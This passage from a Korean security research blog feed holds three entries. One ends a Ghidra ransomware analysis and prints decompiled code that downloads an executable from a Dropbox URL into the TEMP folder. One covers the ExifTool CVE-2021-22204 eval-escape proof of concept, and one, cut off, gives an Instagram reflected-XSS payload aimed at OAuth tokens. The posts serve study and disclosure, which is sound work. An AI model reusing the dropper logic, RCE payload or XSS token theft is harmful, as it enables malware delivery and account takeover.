&#xD30C;&#xC77C;&#xC744; &#xCD94;&#xAC00;&#xD574;&#xC57C; &#xD558;&#xB294; &#xAC74;&#xAC00;? &#xC9C1;&#xC811; &#xD5E4;&#xB354; &#xD30C;&#xC77C;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xB3C4; &#xC788;&#xC9C0;&#xB9CC;, &#xC774;&#xB7F0; WinAPI&#xB4E4;&#xC758; &#xC544;&#xCE74;&#xC774;&#xBE0C; &#xD30C;&#xC77C;&#xC744; &#xB204;&#xAD70;&#xAC00; github&#xC5D0; &#xC62C;&#xB824;&#xB193;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xC800;&#xB294; Visual Studio Community&#xB97C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD574;&#xC11C; &#xD574;&#xB2F9; &#xD5E4;&#xB354; &#xD30C;&#xC77C;&#xC744; &#xC9C1;&#xC811; &#xCD94;&#xAC00;&#xD558;&#xACE0;&#xC790; &#xD558;&#xC600;&#xC73C;&#xB098; &#xC5B4;&#xB5A4; &#xC774;&#xC720;&#xC5D0;&#xC11C;&#xC778;&#xC9C0;&#x2026; &#xAC01;&#xC885; reference&#xB97C; &#xCC3E;&#xC544;&#xC11C; &#xB611;&#xAC19;&#xC774; &#xD574;&#xB3C4; &#xCD94;&#xAC00;&#xAC00; &#xC548;&#xB418;&#xB354;&#xB77C;&#xACE0;&#xC694;&#x2026; &#xB611;&#xAC19;&#xC740; &#xD589;&#xC704;&#xB97C; &#xBC18;&#xBCF5;&#xD558;&#xBA70; &#xC5D4;&#xD130;&#xB97C; &#xACC4;&#xC18D; &#xB204;&#xB974;&#xBA70; &#xBD84;&#xB178; &#xAC8C;&#xC774;&#xC9C0;&#xAC00; &#xCC28;&#xACE0; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2014.png" alt></p><p>&#xADF8;&#xB7EC;&#xB358; &#xC640;&#xC911; &#xC544;&#xB798;&#xC758; github repo&#xB294; &#xC800;&#xC5D0;&#xAC8C; &#xD070; &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xC5C8;&#xC8E0;!</p><p><a href="https://github.com/0x6d696368/ghidra-data/tree/master/typeinfo">https://github.com/0x6d696368/ghidra-data/tree/master/typeinfo</a></p><p>&#xD574;&#xB2F9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; 32&#xBE44;&#xD2B8; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC774;&#xBBC0;&#xB85C; <code>winapi_32.gdt</code> &#xD30C;&#xC77C;&#xC744; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2015.png" alt></p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2016.png" alt></p><p>&#xADF8; &#xD6C4; Data Type Manager&#xC758; &#xC6B0;&#xCE21; &#xC0C1;&#xB2E8;&#xC5D0; &#xC544;&#xB798;&#xCABD; &#xD654;&#xC0B4;&#xD45C; &#xBAA8;&#xC591;&#xC744; &#xD074;&#xB9AD;&#xD55C; &#xD6C4; Open File Archive&#xB97C; &#xD074;&#xB9AD;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2017.png" alt></p><p>&#xADF8;&#xB2E4;&#xC74C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD55C; gdt &#xD30C;&#xC77C;&#xC744; &#xC5F4;&#xC5B4;&#xC8FC;&#xBA74; &#xB05D;!</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2018.png" alt></p><p>&#xC774;&#xC81C; &#xCD94;&#xAC00;&#xAC00; &#xB418;&#xC5B4; &#xC788;&#xB294; &#xBAA8;&#xC2B5;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; &#xD6C4;&#xD6C4; &#xB2E4;&#xB978; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;&#xB4E4;&#xB3C4; &#xBAA8;&#xB450; &#xC801;&#xC6A9;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xC8E0;. &#xC801;&#xC6A9;&#xC774; &#xC644;&#xB8CC;&#xB41C; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function">undefined4 <span class="hljs-title">download_ATAPIConfiguration</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>{  <span class="hljs-keyword">char</span> cVar1;  <span class="hljs-keyword">bool</span> bVar2;  undefined4 uVar3;  HMODULE hModule;  <span class="hljs-keyword">int</span> iVar4;  <span class="hljs-keyword">size_t</span> temp_path_len;  undefined4 *puVar5;  uint uVar6;  LPCSTR pCVar7;  <span class="hljs-keyword">int</span> local_64;  undefined4 local_60;  undefined4 lpdwBufferLength;  uint lpBuffer;  FARPROC InternetCloseHandle_addr;  FARPROC WriteFile_addr;  FARPROC InternetReadFile_addr;  HANDLE local_48;  FARPROC CreateFileW_addr;  <span class="hljs-keyword">char</span> *temp_path;  <span class="hljs-keyword">void</span> *local_3c;  <span class="hljs-keyword">int</span> local_38;  FARPROC HttpSendRequestA_addr;  FARPROC InternetSetOptionW;  FARPROC InternetQueryOptionW_addr;  <span class="hljs-keyword">int</span> hInternet;  FARPROC HttpOpenRequestW_addr;  <span class="hljs-keyword">int</span> hConnect;  FARPROC InternetConnectW_addr;  <span class="hljs-keyword">int</span> local_18;  FARPROC InternetOpenW_addr;  HMODULE local_10;    local_10 = LoadLibraryA(<span class="hljs-string">&quot;wininet.dll&quot;</span>);  InternetOpenW_addr = GetProcAddress(local_10,<span class="hljs-string">&quot;InternetOpenW&quot;</span>);  local_18 = (*InternetOpenW_addr)(<span class="hljs-string">L&quot;WINDOWS&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);  <span class="hljs-keyword">if</span> (local_18 == <span class="hljs-number">0</span>) {    uVar3 = <span class="hljs-number">0xe</span>;  }  <span class="hljs-keyword">else</span> {    hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);    InternetConnectW_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;InternetConnectW&quot;</span>);    hConnect = (*InternetConnectW_addr)(local_18,<span class="hljs-string">L&quot;dl.dropboxusercontent.com&quot;</span>,<span class="hljs-number">0x1bb</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>);    <span class="hljs-keyword">if</span> (hConnect == <span class="hljs-number">0</span>) {      uVar3 = <span class="hljs-number">0xe</span>;    }    <span class="hljs-keyword">else</span> {      hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);      HttpOpenRequestW_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;HttpOpenRequestW&quot;</span>);      hInternet = (*HttpOpenRequestW_addr)                            (hConnect,&amp;DAT_00413270,<span class="hljs-string">L&quot;/s/uzu60whrg1spnyy/ATAPIConfiguration&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,                             <span class="hljs-number">0x800000</span>,<span class="hljs-number">1</span>);      <span class="hljs-keyword">if</span> (hInternet == <span class="hljs-number">0</span>) {        uVar3 = <span class="hljs-number">0xe</span>;      }      <span class="hljs-keyword">else</span> {        lpdwBufferLength = <span class="hljs-number">4</span>;        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        InternetQueryOptionW_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;InternetQueryOptionW&quot;</span>);        iVar4 = (*InternetQueryOptionW_addr)(hInternet,<span class="hljs-number">0x1f</span>,&amp;lpBuffer,&amp;lpdwBufferLength);        <span class="hljs-keyword">if</span> (iVar4 != <span class="hljs-number">0</span>) {          hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);          InternetSetOptionW = GetProcAddress(hModule,<span class="hljs-string">&quot;InternetSetOptionW&quot;</span>);          lpBuffer = lpBuffer | <span class="hljs-number">0x1180</span>;          (*InternetSetOptionW)(hInternet,<span class="hljs-number">0x1f</span>,&amp;lpBuffer,<span class="hljs-number">4</span>);        }        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        HttpSendRequestA_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;HttpSendRequestA&quot;</span>);        local_38 = (*HttpSendRequestA_addr)(hInternet,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);        local_3c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">16000</span>);        <span class="hljs-built_in">memset</span>(local_3c,<span class="hljs-number">0</span>,<span class="hljs-number">16000</span>);        <span class="hljs-built_in">memset</span>(download_path,<span class="hljs-number">0</span>,<span class="hljs-number">0x1000</span>);        temp_path = getenv(<span class="hljs-string">&quot;TEMP&quot;</span>);        temp_path_len = <span class="hljs-built_in">strlen</span>(temp_path);        DAT_0041602c = (LPCSTR)<span class="hljs-built_in">malloc</span>(temp_path_len + <span class="hljs-number">0x1000</span>);        <span class="hljs-built_in">strcpy</span>(DAT_0041602c,temp_path);        uVar6 = <span class="hljs-number">0xffffffff</span>;        pCVar7 = DAT_0041602c;        <span class="hljs-keyword">do</span> {          <span class="hljs-keyword">if</span> (uVar6 == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;          uVar6 = uVar6 - <span class="hljs-number">1</span>;          cVar1 = *pCVar7;          pCVar7 = pCVar7 + <span class="hljs-number">1</span>;        } <span class="hljs-keyword">while</span> (cVar1 != <span class="hljs-string">&apos;\0&apos;</span>);        puVar5 = (undefined4 *)(DAT_0041602c + (~uVar6 - <span class="hljs-number">1</span>));        *puVar5 = <span class="hljs-number">0x4154415c</span>;        puVar5[<span class="hljs-number">1</span>] = <span class="hljs-number">0x6f434950</span>;        puVar5[<span class="hljs-number">2</span>] = <span class="hljs-number">0x6769666e</span>;        puVar5[<span class="hljs-number">3</span>] = <span class="hljs-number">0x74617275</span>;        puVar5[<span class="hljs-number">4</span>] = <span class="hljs-number">0x2e6e6f69</span>;        puVar5[<span class="hljs-number">5</span>] = <span class="hljs-number">0x657865</span>;        MultiByteToWideChar(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,DAT_0041602c,<span class="hljs-number">-1</span>,download_path,<span class="hljs-number">0x1000</span>);        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);        CreateFileW_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;CreateFileW&quot;</span>);                    <span class="hljs-comment">/* GENERIC_READ | GENERIC_WRITE */</span>        local_48 = (HANDLE)(*CreateFileW_addr)(download_path,<span class="hljs-number">0xc0000000</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0</span>);        local_60 = <span class="hljs-number">0</span>;        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        InternetReadFile_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;InternetReadFile&quot;</span>);        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);        WriteFile_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;WriteFile&quot;</span>);        <span class="hljs-keyword">if</span> (local_38 == <span class="hljs-number">0</span>) {          uVar3 = <span class="hljs-number">0xe</span>;        }        <span class="hljs-keyword">else</span> {          local_64 = <span class="hljs-number">0</span>;          <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> ) {            iVar4 = (*InternetReadFile_addr)(hInternet,local_3c,<span class="hljs-number">0x2000</span>,&amp;local_64);            <span class="hljs-keyword">if</span> ((iVar4 == <span class="hljs-number">0</span>) || (local_64 == <span class="hljs-number">0</span>)) {              bVar2 = <span class="hljs-literal">false</span>;            }            <span class="hljs-keyword">else</span> {              bVar2 = <span class="hljs-literal">true</span>;            }            <span class="hljs-keyword">if</span> (!bVar2) <span class="hljs-keyword">break</span>;            (*WriteFile_addr)(local_48,local_3c,local_64,&amp;local_60,<span class="hljs-number">0</span>);          }          hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);          InternetCloseHandle_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;InternetCloseHandle&quot;</span>);          CloseHandle(local_48);          (*InternetCloseHandle_addr)(local_18);          (*InternetCloseHandle_addr)(hConnect);          (*InternetCloseHandle_addr)(hInternet);          uVar3 = <span class="hljs-number">1</span>;        }      }    }  }  <span class="hljs-keyword">return</span> uVar3;}</code></pre><p>&#xD568;&#xC218;&#xAC00; &#xB9CE;&#xC774; &#xAE30;&#xB124;&#xC694;&#x2026; &#xC704;&#xC5D0;&#xC11C;&#xBD80;&#xD130; &#xB0B4;&#xB824;&#xAC00; &#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2019.png" alt></p><p><code>HttpOpenRequestW</code>&#xB97C; &#xD1B5;&#xD574; <code>dl.dropboxusercontent.com/s/uzu60whrglspnyy/ATAPIConfiguration</code>&#xC5D0; &#xC5F0;&#xACB0;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2020.png" alt></p><p>TEMP &#xD3F4;&#xB354;&#xC758; &#xACBD;&#xB85C;&#xB97C; &#xAC00;&#xC838;&#xC640; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD560; &#xACBD;&#xB85C;&#xB97C; &#xC124;&#xC815;&#xD558;&#xB294; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADFC;&#xB370; hex&#xB85C; &#xB418;&#xC5B4; &#xC788;&#xC5B4;&#xC11C; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xB124;&#xC694;. &#xB514;&#xC2A4; &#xC5B4;&#xC148;&#xBE14; &#xCC3D;&#xC5D0;&#xC11C; Conver &#x2192; Char Sequence&#xB85C; &#xC5B4;&#xB5A4; &#xBB38;&#xC790;&#xC5F4;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2021.png" alt></p><p><code>\\ATAPIConfiguration.exe\0</code>&#xB124;&#xC694;. &#xC774;&#xC81C; &#xACBD;&#xB85C; &#xC124;&#xC815;&#xAE4C;&#xC9C0; &#xD588;&#xC73C;&#xB2C8; &#xD30C;&#xC77C;&#xC744; &#xC77D;&#xC5B4;&#xC640; &#xD574;&#xB2F9; &#xACBD;&#xB85C;&#xC5D0; &#xC0DD;&#xC131;&#xD558;&#xACA0;&#xC8E0;?</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2022.png" alt></p><p>&#xBE59;&#xACE0;&#xC785;&#xB2C8;&#xB2E4;. &#xC815;&#xB9AC;&#xD558;&#xBA74; <code>download_ATAPIConfiguration()</code>&#xC740; <code>dl.dropboxusercontent.com/s/uzu60whrglspnyy/ATAPIConfiguration</code>&#xC5D0; &#xC811;&#xC18D;&#xD574;&#xC11C; <code>%TEMP%\ATAPIConfiguration.exe</code>&#xB85C; &#xD30C;&#xC77C;&#xC744; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD55C;&#xB2E4;!</p><h1 id="to-be-continued&#x2026;"><a href="#to-be-continued&#x2026;" class="headerlink" title="to be continued&#x2026;"></a>to be continued&#x2026;</h1><p>&#xB2E4;&#xC74C;&#xC5D0;&#xB294; ATAPIConfiguration&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xB2E4;&#xB904;&#xBCFC; &#xC608;&#xC815;&#xC785;&#xB2C8;&#xB2E4;. &#xC6D0;&#xB798; &#xD55C; &#xAE00;&#xC5D0; &#xBAA8;&#xB450; &#xB2E4; &#xB2F4;&#xC73C;&#xB824; &#xD588;&#xB294;&#xB370; &#xC0DD;&#xAC01;&#xBCF4;&#xB2E4; &#xB9CE;&#xC774; &#xAE38;&#xC5B4;&#xC84C;&#xB124;&#xC694;. &#xB2E4;&#xB978; &#xBD84;&#xC11D;&#xC740; &#xBAA8;&#xB450; &#xC81C;&#xC678;&#xD558;&#xACE0; ghidra&#xB97C; &#xC0AC;&#xC6A9;&#xD55C; &#xC815;&#xC801; &#xBD84;&#xC11D;&#xB9CC; &#xC9C4;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB77C; &#xD2C0;&#xB9B0; &#xB0B4;&#xC6A9;&#xC774; &#xC874;&#xC7AC;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;! &#xADF8;&#xB7FC; &#xCD5C;&#xB300;&#xD55C; &#xBE68;&#xB9AC; &#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xB97C; &#xC900;&#xBE44;&#xD574;&#xC624;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; &#xBAA8;&#xB450; &#xC548;&#xB155;~</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>malware</tag>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
      <tag>ghidra</tag>
      
      <tag>ransomware</tag>
      
      <tag>ghidra tutorials</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-22204: ExifTool 임의 코드 실행 취약점</title>
    <link href="/2021/05/18/l0ch/2021-05-18/"/>
    <url>/2021/05/18/l0ch/2021-05-18/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">ExifTool CVE-2021-22204 - Arbitrary Code Execution</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>ExifTool </li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC774;&#xBBF8;&#xC9C0; &#xD30C;&#xC77C;&#xC758; &#xBA54;&#xD0C0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC218;&#xC815;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; ExifTool&#xC5D0;&#xC11C; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>ExifTool&#xC740; perl &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB85C; &#xAD6C;&#xD604;&#xB418;&#xC5C8;&#xC73C;&#xBA70; &#xCDE8;&#xC57D;&#xC810;&#xC740; DjVu &#xD30C;&#xC77C;&#xC744; &#xD30C;&#xC2F1;&#xD558;&#xB294; <code>DjVu</code> &#xBAA8;&#xB4C8;&#xC758; <code>ParseAnt</code> &#xBA54;&#xC11C;&#xB4DC;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">ParseAnt</span>($)</span><span class="hljs-function">...</span><span class="hljs-function">$<span class="hljs-title">tok</span> = &apos;&apos;</span>;  <span class="hljs-keyword">for</span> (;;) {      <span class="hljs-comment"># get string up to the next quotation mark</span>      <span class="hljs-comment"># this doesn&apos;t work in perl 5.6.2! grrrr</span>      <span class="hljs-comment"># last Tok unless $$dataPt =~ /(.*?)&quot;/sg;</span>      <span class="hljs-comment"># $tok .= $1;</span>      <span class="hljs-keyword">my</span> $pos = <span class="hljs-keyword">pos</span>($$dataPt);      <span class="hljs-keyword">last</span> Tok <span class="hljs-keyword">unless</span> $$dataPt =~ <span class="hljs-regexp">/&quot;/sg</span>;      $tok .= <span class="hljs-keyword">substr</span>($$dataPt, $pos, <span class="hljs-keyword">pos</span>($$dataPt)-<span class="hljs-number">1</span>-$pos);      <span class="hljs-comment"># we&apos;re good unless quote was escaped by odd number of backslashes</span>      <span class="hljs-keyword">last</span> <span class="hljs-keyword">unless</span> $tok =~ <span class="hljs-regexp">/(\\\\+)$/</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">length</span>($1) &amp; <span class="hljs-number">0x01</span>;      $tok .= <span class="hljs-string">&apos;&quot;&apos;</span>;    <span class="hljs-comment"># quote is part of the string</span>  }  <span class="hljs-comment"># must protect unescaped &quot;$&quot; and &quot;@&quot; symbols, and &quot;\\&quot; at end of string</span>  $tok =~ <span class="hljs-keyword">s</span>{\\\\(.)|([\\$\\@]|\\\\$)}{<span class="hljs-string">&apos;\\\\&apos;</span>.($2 || $1)}sge;  <span class="hljs-comment"># convert C escape sequences (allowed in quoted text)</span>  $tok = <span class="hljs-keyword">eval</span> <span class="hljs-string">qq{&quot;$tok&quot;}</span>;...</code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xB294; C&#xC640; &#xC720;&#xC0AC;&#xD55C; escape sequence&#xB97C; &#xAD6C;&#xD604;&#xD55C; &#xCF54;&#xB4DC;&#xB85C; <code>$tok</code> &#xBCC0;&#xC218;&#xC758; &#xD2B9;&#xC218; &#xBB38;&#xC790;&#xB97C; escape &#xCC98;&#xB9AC;&#xD55C; &#xB4A4; &#xC774;&#xB97C; <code>eval</code> &#xD568;&#xC218;&#xC5D0; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7EC;&#xB098; &#xC815;&#xADDC;&#xC2DD; <code>tok =~ /(\\\\+)$/</code> &#xC5D0;&#xC11C; <code>$</code>&#xAC00; &#xBB38;&#xC790;&#xC5F4;&#xC758; &#xB05D;&#xACFC; &#xAC1C;&#xD589;&#xC744; &#xC758;&#xBBF8;&#xD574; &#xBC31; &#xC2AC;&#xB798;&#xC2DC;&#xC640; &#xAC1C;&#xD589; &#xBB38;&#xC790;&#xB97C; &#xC4F0;&#xBA74; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xB05D;&#xB09C; &#xAC83;&#xC73C;&#xB85C; &#xC778;&#xC2DD;&#xD558;&#xACE0; &#xAC1C;&#xD589; &#xC774;&#xD6C4;&#xC5D0; &#xC624;&#xB294; &#xD2B9;&#xC218; &#xBB38;&#xC790;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>return data;</code> &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xC544;&#xB798; PoC&#xC640; &#xAC19;&#xC774; <code>eval</code> &#xD568;&#xC218;&#xB97C; &#xBC97;&#xC5B4;&#xB098; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">(metadata    (Author <span class="hljs-string">&quot;\\</span><span class="hljs-string">&quot;</span> . <span class="hljs-keyword">return</span> `date`; <span class="hljs-comment">#&quot;)</span>)</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>arbitrary code execution</tag>
      
      <tag>L0ch</tag>
      
      <tag>escape sequence</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Reflected XSS를 통한 인스타그램 계정 탈취</title>
    <link href="/2021/05/17/idioth/2021-05-17/"/>
    <url>/2021/05/17/idioth/2021-05-17/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ysamm.com/?p=695">One-click reflected XSS in www.instagram.com due to unfiltered URI schemes leads to account takeover</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>www.instagram.com &#xB370;&#xC2A4;&#xD06C;&#xD1B1; &#xBC84;&#xC804;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xB370;&#xC2A4;&#xD06C;&#xD1B1; &#xBC84;&#xC804;&#xC758; www.instagram.com &#xC5D0;&#xC11C; &#xD544;&#xD130;&#xB9C1; &#xB418;&#xC9C0; &#xC54A;&#xC740; URI &#xC2A4;&#xD0A4;&#xB9C8;&#xB97C; &#xD1B5;&#xD574; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xD0ED;&#xC744; &#xC5F4;&#xAC70;&#xB098; &#xB2EB;&#xB294;&#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xB9C8;&#xC6B0;&#xC2A4;&#xC758; &#xAC00;&#xC6B4;&#xB370; &#xBC84;&#xD2BC;&#xC744; &#xD074;&#xB9AD;&#xD560; &#xC2DC; reflected XSS&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xCDE8;&#xC57D;&#xD55C; &#xC5D4;&#xB4DC; &#xD3EC;&#xC778;&#xD2B8;&#xB85C; &#xC804;&#xB2EC;&#xB41C; &#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xB0B4;&#xBD80;&#xC758; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xAC00; <code>href</code> &#xC18D;&#xC131;&#xC758; html <code>a</code> &#xD0DC;&#xADF8; &#xB0B4;&#xBD80;&#xC5D0; &#xBC18;&#xC601;&#xB418;&#xC5B4; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB294; www.instagram.com &#xC5D0;&#xC11C; &#xD574;&#xCEE4;&#xC758; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; URI &#xC2A4;&#xD0A4;&#xB9C8;&#xC774;&#xBA70; &#xACF5;&#xACA9;&#xC774; &#xC2E4;&#xD328;&#xD558;&#xB354;&#xB77C;&#xB3C4; &#xC774;&#xBCA4;&#xD2B8; &#xD578;&#xB4E4;&#xB7EC;&#xAC00; URL&#xC744; &#xB2E4;&#xB978; &#xD3EC;&#xB9F7;&#xC73C;&#xB85C; &#xBCC0;&#xACBD;&#xD569;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC0C8;&#xB85C;&#xC6B4; &#xD0ED;&#xC5D0;&#xC11C; URL&#xC744; &#xC5F4;&#xAE30; &#xC704;&#xD574; &#xB9C8;&#xC6B0;&#xC2A4; &#xAC00;&#xC6B4;&#xB370; &#xBC84;&#xD2BC;&#xC744; &#xD074;&#xB9AD;&#xD558;&#xAC70;&#xB098; &#xC67C;&#xCABD;&#xACFC; &#xC624;&#xB978;&#xCABD;&#xC744; &#xB3D9;&#xC2DC;&#xC5D0; &#xB204;&#xB974;&#xB294; &#xACBD;&#xC6B0;&#xC5D0; XSS&#xC640; &#xACC4;&#xC815; &#xD0C8;&#xCDE8;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC0C8; &#xD0ED;&#xC5D0;&#xC11C; &#xC5F4; &#xACBD;&#xC6B0; URL&#xC744; &#xBCC0;&#xACBD;&#xD558;&#xB294; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xCF54;&#xB4DC;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xC5EC; &#xACF5;&#xACA9;&#xC5D0; &#xC131;&#xACF5;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC0AC;&#xC6A9;&#xC790;&#xAC00; <code>https://www.instagram.com/accounts/recovery/landing/?token=true&amp;next=javascript:fetch(&#x201C;https://www.facebook.com/x/oauth/status?client_id=124024574287414&amp;input_token&amp;origin=1&amp;redirect_uri=https%3A%2F%2Fwww.instagram.com%2F&amp;sdk=joey&amp;wants_cookie_data=true&#x201C;,{mode:&#x201D;cors&#x201D;,credentials:&#x201D;include&#x201D;}).then(function(a){alert(a.headers.get(&#x201C;fb-ar&#x201D;));console.log(a.headers.get(&#x201C;fb-ar&#x201D;));});</code> &#xB9C1;&#xD06C;&#xC5D0; &#xC811;&#xC18D;&#xD560; &#xACBD;&#xC6B0; <code>/x/oauth/status</code> &#xD398;&#xC774;&#xC2A4;&#xBD81; OAuth 